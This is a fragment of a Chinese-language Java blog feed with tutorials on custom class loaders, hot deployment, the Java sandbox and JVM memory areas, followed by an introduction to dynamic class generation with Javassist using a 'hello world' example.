class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.base.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.applet.Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFileClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String directory;<span class="comment">//被加载的类所在的目录</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 指定要加载的类所在的文件目录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> directory</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyFileClassLoader</span><span class="params">(String directory,ClassLoader parent)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        <span class="built_in">this</span>.directory = directory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//把类名转换为目录</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> directory+File.separator+name.replace(<span class="string">&quot;.&quot;</span>, File.separator)+<span class="string">&quot;.class&quot;</span>;</span><br><span class="line">            <span class="comment">//构建输入流</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="comment">//存放读取到的字节数据</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span> buf[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>((len=in.read(buf))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span> data[] = baos.toByteArray();</span><br><span class="line">            in.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyFileClassLoader</span> <span class="variable">myFileClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyFileClassLoader</span>(<span class="string">&quot;d:/&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> myFileClassLoader.loadClass(<span class="string">&quot;com.ceshi.Demo&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自定义网络类加载器"><a href="#自定义网络类加载器" class="headerlink" title="自定义网络类加载器"></a>自定义网络类加载器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.base.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyURLClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyURLClassLoader</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> url+ <span class="string">&quot;/&quot;</span>+name.replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;.class&quot;</span>;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(path);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> url.openStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">            <span class="type">byte</span> buf[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span>((len=inputStream.read(buf))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] data = baos.toByteArray();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MyURLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyURLClassLoader</span>(<span class="string">&quot;http://localhost:8080/examples&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;com.ceshi.Demo&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="热部署类加载器"><a href="#热部署类加载器" class="headerlink" title="热部署类加载器"></a>热部署类加载器</h3><blockquote><p>当我们调用loadClass方法加载类时，会采用双亲委派模式，即如果类已经被加载，就从缓存中获取，不会重新加载。如果同一个class被同一个类加载器多次加载，则会报错。因此，我们要实现热部署让同一个class文件被不同的类加载器重复加载即可。但是不能调用loadClass方法，而应该调用findClass方法，避开双亲委托模式，从而实现同一个类被多次加载，实现热部署。<br /></p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyFileClassLoader</span> <span class="variable">myFileClassLoader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyFileClassLoader</span>(<span class="string">&quot;d:/&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">MyFileClassLoader</span> <span class="variable">myFileClassLoader2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyFileClassLoader</span>(<span class="string">&quot;d:/&quot;</span>,myFileClassLoader1);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> myFileClassLoader1.loadClass(<span class="string">&quot;com.ceshi.Demo&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz2</span> <span class="operator">=</span> myFileClassLoader2.loadClass(<span class="string">&quot;com.ceshi.Demo&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;class1:&quot;</span>+clazz1.hashCode());</span><br><span class="line">System.out.println(<span class="string">&quot;class2:&quot;</span>+clazz2.hashCode());</span><br><span class="line">结果:class1和class2的hashCode一致</span><br><span class="line"></span><br><span class="line"><span class="type">MyFileClassLoader</span> <span class="variable">myFileClassLoader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyFileClassLoader</span>(<span class="string">&quot;d:/&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">MyFileClassLoader</span> <span class="variable">myFileClassLoader2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyFileClassLoader</span>(<span class="string">&quot;d:/&quot;</span>,myFileClassLoader1);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz3</span> <span class="operator">=</span> myFileClassLoader1.findClass(<span class="string">&quot;com.ceshi.Demo&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz4</span> <span class="operator">=</span> myFileClassLoader2.findClass(<span class="string">&quot;com.ceshi.Demo&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;class3:&quot;</span>+clazz3.hashCode());</span><br><span class="line">System.out.println(<span class="string">&quot;class4:&quot;</span>+clazz4.hashCode());</span><br><span class="line">结果：class1和class2的hashCode不一致</span><br></pre></td></tr></table></figure><h2 id="类的显式与隐式加载"><a href="#类的显式与隐式加载" class="headerlink" title="类的显式与隐式加载"></a>类的显式与隐式加载</h2><p>类的加载方式是指虚拟机将class文件加载到内存的方式。</p><blockquote><p>显式加载是指在java代码中通过调用ClassLoader加载class对象，比如Class.forName(String name)；this.getClass().getClassLoader().loadClass()加载类。<br>隐式加载指不需要在java代码中明确调用加载的代码，而是通过虚拟机自动加载到内存中。比如在加载某个class时，该class引用了另外一个类的对象，那么这个对象的字节码文件就会被虚拟机自动加载到内存中。<br /></p></blockquote><h2 id="线程上下文类加载器"><a href="#线程上下文类加载器" class="headerlink" title="线程上下文类加载器"></a>线程上下文类加载器</h2><blockquote><p>在Java中存在着很多的服务提供者接口SPI，全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的API，这些接口一般由第三方提供实现，常见的SPI有JDBC、JNDI等。这些SPI的接口（比如JDBC中的java.sql.Driver）属于核心类库，一般存在rt.jar包中，由根类加载器加载。而第三方实现的代码一般作为依赖jar包存放在classpath路径下，由于SPI接口中的代码需要加载具体的第三方实现类并调用其相关方法，SPI的接口类是由根类加载器加载的，Bootstrap类加载器无法直接加载位于classpath下的具体实现类。由于双亲委派模式的存在，Bootstrap类加载器也无法反向委托AppClassLoader加载SPI的具体实现类。在这种情况下，java提供了线程上下文类加载器用于解决以上问题。<br /></p></blockquote><blockquote><p>线程上下文类加载器可以通过java.lang.Thread的getContextClassLoader()来获取，或者通过setContextClassLoader(ClassLoader cl)来设置线程的上下文类加载器。如果没有手动设置上下文类加载器，线程将继承其父线程的上下文类加载器，初始线程的上下文类加载器是系统类加载器（AppClassLoader），在线程中运行的代码可以通过此类加载器来加载类或资源。<br /></p></blockquote><p>显然这种加载类的方式破坏了双亲委托模型，但它使得java类加载器变得更加灵活。</p><p><img src="/assets/image-20230506140009-1bjnl52.png" alt="image.png"></p><p>我们以JDBC中的类为例做一下说明。在JDBC中有一个类java.sql.DriverManager，它是rt.jar中的类，用来注册实现了java.sql.Driver接口的驱动类，而java.sql.Driver的实现类一般都是位于数据库的驱动jar包中的。</p><p><img src="/assets/image-20230506140025-t65yps4.png" alt="image.png"></p><p><img src="/assets/image-20230506140040-p9mtvqi.png" alt="image.png"></p><p>Java.util.ServiceLoader的部分源码截图：</p><p><img src="/assets/image-20230506140109-zwujeqr.png" alt="image.png"></p><h2 id="沙箱安全机制"><a href="#沙箱安全机制" class="headerlink" title="沙箱安全机制"></a>沙箱安全机制</h2><p>java安全模型的核心是Java沙箱，沙箱是一个限制程序运行的环境（沙箱主要限制系统资源的访问，如cpu,内存等等。不同级别的沙箱对这些资源的访问限制也不一样）。沙箱安全机制就是将java代码限定在虚拟机（jvm) 特定的运行范围中，并且严格限制代码对本地系统资源的访问，通过这样的措施来保证对代码的有效隔离，防止对系统造成破坏。</p><h2 id="沙箱模型发展历程"><a href="#沙箱模型发展历程" class="headerlink" title="沙箱模型发展历程"></a>沙箱模型发展历程</h2><p>Java1.0沙箱安全模型</p><p><img src="/assets/image-20230430170300-g5must3.png" alt="image.png"></p><p>但是该种机制导致了用户无法执行远程代码访问本地系统文件，所以在Java1.1版本中对安全机制做了如下改动</p><p><img src="/assets/image-20230430170435-v6idcxl.png" alt="image.png"></p><p>在Java1.2版本中再次改进了安全机制，增加了代码签名。都会按照用户的安全策略设定，由类加载器加载到虚拟机中权限不同的运行空间。</p><p><img src="/assets/image-20230430170732-lojjioc.png" alt="image.png"></p><p>从Java1.6至今引入域的概念，虚拟机会把所有的代码加载到不同系统域或应用域。</p><p><img src="/assets/image-20230430170958-d9r3l0q.png" alt="image.png"></p><h2 id="沙箱的组成"><a href="#沙箱的组成" class="headerlink" title="沙箱的组成"></a>沙箱的组成</h2><blockquote><p>1、字节码校验器 bytecode verifier<br>确保java类文件遵循java语言规范，帮助程序实现内存保护。并不是所有类都经过字节码校验器，如核心类。<br>2、类加载器 class loader<br>双亲委派机制、安全校验等，防止恶意代码干涉。守护类库边界。<br>3、存取控制器 access controller<br>它可以控制核心API对操作系统的存取权限，控制策略可以有由用户指定。<br>4、安全管理器 security manager<br>它是核心API和系统间的主要接口，实现权限控制，比存取控制器优先级高。<br>5、安全软件包 secruity package<br>java.secruity下的类和扩展包下的类，允许用户为自己的应用增加新的安全特性。包括：安全提供者、消息摘要、数字签名、加密、鉴别等。<br /></p></blockquote><h1 id="PC寄存器"><a href="#PC寄存器" class="headerlink" title="PC寄存器"></a>PC寄存器</h1><p>程序计数器：Program Counter Register</p><p>每个线程都有一个程序计数器，是线程私有的，就是一个指针, 指向方法区中的方法字节码：<strong>用来存储指向一条指令的地址， 也即将要执行的下一条指令代码。</strong></p><h1 id="方法区"><a href="#方法区" class="headerlink" title="方法区"></a>方法区</h1><p>方法区：Method Area</p><p>方法区是被线程共享，所有字段和方法字节码，以及一些特殊方法，如构造函数，接口代码也在此定义。简单说，所有定义的方法信息都保存在该区域，此区域属于共享区域。</p><p>静态变量、常量、类信息（构造方法、接口定义）、运行时的常量池存在方法区中，但是实例变量存在堆内存中和方法区无关。</p><h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><p>栈是一种FILO（先进后出）类型的数据结构。在虚拟机内存中有两个栈，一个是虚拟机栈，一个是本地方法栈。其中虚拟机栈是用来执行Java执行代码的。而本地方法栈则是为虚拟机使用到的Native方法服务。在java程序运行过程中就是采用栈这种数据结构，先执行main函数也就是main函数先入栈，然后根据调用函数在依次入栈，因为栈是先进后出的，所以最后程序会回到main函数。栈中包含的元素为栈帧，一个栈帧对应一个方法，且栈式线程独立的。</p><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧(Stack Frame)是虚拟机运行时数据区中的虚拟机栈(Virtual Machine Stack) 的栈元素。栈帧存储了方法的局部变量表、操作数栈、动态连接和方法返回地址等信息。每一个方法从调用开始至执行完成的过程,都对应着一个栈帧在虚拟机栈里面从入栈到出栈的过程。</p><p>一个线程中的方法调用链可能会很长,很多方法都同时处于执行状态。对于执行引擎来说,在活动线程中,只有位于栈顶的栈帧才是有效的,称为当前栈帧(Current Stack Frame),与这个栈帧相关联的方法称为当前方法(Current Method)。典型的栈帧结构如图：<br><img src="/assets/image-20230430204219-mcosc57.png" alt="image.png"><br /></p><h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><p>一个JVM实例只存在一个堆内存，堆也是Java内存管理的核心区域，Java堆区域在JVM启动的时候被创建，其空间大小也就确定了，其也是JVM管理最大的一块内存空间。类加载器读取类文件后，如类、方法、常量、变量、引用类型的真实对象就会被保存在堆中。</p><h2 id="堆的分区"><a href="#堆的分区" class="headerlink" title="堆的分区"></a>堆的分区</h2><p><img src="/assets/image-20230501180042-w7ubtqr.png" alt="image.png"></p><h1 id="创建对象内存图"><a href="#创建对象内存图" class="headerlink" title="创建对象内存图"></a>创建对象内存图</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;在学习&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student1.name  =<span class="string">&quot;小明&quot;</span>;</span><br><span class="line">        student1.age = <span class="number">13</span>;</span><br><span class="line">        student1.study();</span><br><span class="line">        System.out.println(student1);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20230506192132-u9d6e6m.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态字节码</title>
      <link href="/2023/05/05/%E5%8A%A8%E6%80%81%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2023/05/05/%E5%8A%A8%E6%80%81%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>在Java中其字节码以二进制的形式存储在class文件中，每一个class文件都包含一个java类或接口，我们可以通过一些动态字节码技术去实现动态创建类、添加类的属性和方法、设置类的父类，以及修改类的方法等操作。常用的动态字节码类库有Javassist、ASM等。而Javassist相比ASM其不需要接触JVM底层的指令，只需要使用Javassist提供API接口就可以实现动态字节码编程，Mybatis动态是实现Dao接口底层也是使用到了Javassist技术，所以这篇文章主要介绍一下Javassist的使用。</p><h1 id="Javassist依赖导入"><a href="#Javassist依赖导入" class="headerlink" title="Javassist依赖导入"></a>Javassist依赖导入</h1><p>使用Javassist之前需要导入依赖，在Maven的pom添加如下依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.29</span><span class="number">.1</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h1 id="Javassist常用类"><a href="#Javassist常用类" class="headerlink" title="Javassist常用类"></a>Javassist常用类</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool：ClassPool 类可以控制的类的字节码，例如创建一个类或加载一个类，与 JVM 类装载器类似</span><br><span class="line">CtClass： CtClass提供了类的操作，如在类中动态添加新字段、方法和构造函数、以及改变类、父类和接口的方法</span><br><span class="line">CtField：类的属性，通过它可以给类创建新的属性，还可以修改已有的属性的类型，访问修饰符等</span><br><span class="line">CtMethod：表示类中的方法，通过它可以给类创建新的方法，还可以修改返回类型，访问修饰符等， 甚至还可以修改方法体内容代码</span><br><span class="line">CtConstructor：用于访问类的构造，与CtMethod类的作用类似</span><br></pre></td></tr></table></figure><h1 id="Javassist使用"><a href="#Javassist使用" class="headerlink" title="Javassist使用"></a>Javassist使用</h1><h2 id="添加方法"><a href="#添加方法" class="headerlink" title="添加方法"></a>添加方法</h2><p>看看如下一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 利用类池创建类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;ysoserial.JavassistTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建方法</span></span><br><span class="line">        <span class="comment">// 1.返回值类型 2.方法名 3.形式参数列表 4.所属类</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType, <span class="string">&quot;execute&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        <span class="comment">// 设置方法的修饰符列表</span></span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        <span class="comment">// 设置方法体</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;hello world\&quot;);&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">// 给类添加方法</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line">        <span class="comment">// 调用方法</span></span><br><span class="line">        Class&lt;?&gt; aClass = ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        method.invoke(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在代码的12行-14创建了一个类池，然后利用makeClass去创建一个类</p><p>当一个类已存在的时候，我们还可以利用getCtClass去获取这个类，然后对这个类进行动态修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass1</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;ysoserial.JavassistTest&quot;</span>);</span><br></pre></td></tr></table></figure><p>在创建或获取一个类之后，我们通过会把这个对象赋值给一个ctClass句柄，然后通过ctClass句柄去操作这个类</p><p>代码的第17行利用CtMethod类添加一个execute方法，在new CtMethod里面依次有四个参数，分别为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CtClass.voidType  <span class="comment">//返回值的类型</span></span><br><span class="line"><span class="string">&quot;execute&quot;</span>  <span class="comment">//添加的方法名</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;  <span class="comment">//形参列表</span></span><br><span class="line">ctClass  <span class="comment">//所属类，也就是我们利用类池创建出来的那个类</span></span><br></pre></td></tr></table></figure><p>返回的参数类型，可以在CtClass这类的源码里面可以清晰查看</p><p><img src="/assets/image-20230505114400-y667iuv.png" alt="image.png"></p><p>代码的第19行设置我们之前定义的execute这个方法的访问修饰符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctMethod.setModifiers(Modifier.PUBLIC);</span><br></pre></td></tr></table></figure><p>代码的第21行设置我们之前定义的execute这个方法体里面的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;hello world\&quot;);&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><p>代码的第23行，把之前我们在方法里面设置好的东西全部添加到类当中去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctClass.addMethod(ctMethod);</span><br></pre></td></tr></table></figure><p>代码的第25-26行转化为class类然后进行实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = ctClass.toClass();</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aClass.newInstance();</span><br></pre></td></tr></table></figure><p>代码的27-28行获取方法并执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;execute&quot;</span>);</span><br><span class="line">method.invoke(o);</span><br></pre></td></tr></table></figure><p>执行代码可以看到输出hello world</p><p><img src="/assets/image-20230505135209-yjwy1j6.png" alt="image.png"></p><h2 id="添加成员属性"><a href="#添加成员属性" class="headerlink" title="添加成员属性"></a>添加成员属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 